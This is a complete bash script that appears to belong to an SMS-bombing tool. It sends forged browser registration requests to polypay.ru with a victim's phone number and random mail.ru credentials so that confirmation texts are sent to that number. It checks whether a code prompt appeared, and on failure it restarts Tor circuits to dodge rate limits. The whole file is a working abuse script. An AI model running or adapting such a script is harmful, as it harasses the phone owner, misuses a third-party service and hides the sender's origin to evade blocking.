#!/bin/bash

PHONE="$(echo "$1" | sed 's/+//')"

echo "+$PHONE"


EMAIL=$(echo "stop_war_Ukraine_$RANDOM@mail.ru" |jq -sRr @uri)
RESULT=$(curl -sk 'https://www.polypay.ru/reg' \
           -H 'Connection: keep-alive' \
           -H 'Cache-Control: max-age=0' \
           -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
           -H 'sec-ch-ua-mobile: ?0' \
           -H 'sec-ch-ua-platform: "Windows"' \
           -H 'Origin: https://www.polypay.ru' \
           -H 'Upgrade-Insecure-Requests: 1' \
           -H 'DNT: 1' \
           -H 'Content-Type: application/x-www-form-urlencoded' \
           -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
           -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
           -H 'Sec-Fetch-Site: same-origin' \
           -H 'Sec-Fetch-Mode: navigate' \
           -H 'Sec-Fetch-User: ?1' \
           -H 'Sec-Fetch-Dest: document' \
           -H 'Referer: https://www.polypay.ru/reg' \
           -H 'Accept-Language: ru-UA,ru;q=0.9' \
           --data-raw "phone=%2B$PHONE&login=$EMAIL&pass=$EMAIL&pass2=$EMAIL" \
           --compressed)

if [ "$(echo "$RESULT" | grep -c '"Код подтверждения')" = "0" ]; then
  echo "$RESULT" | grep 'title'
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
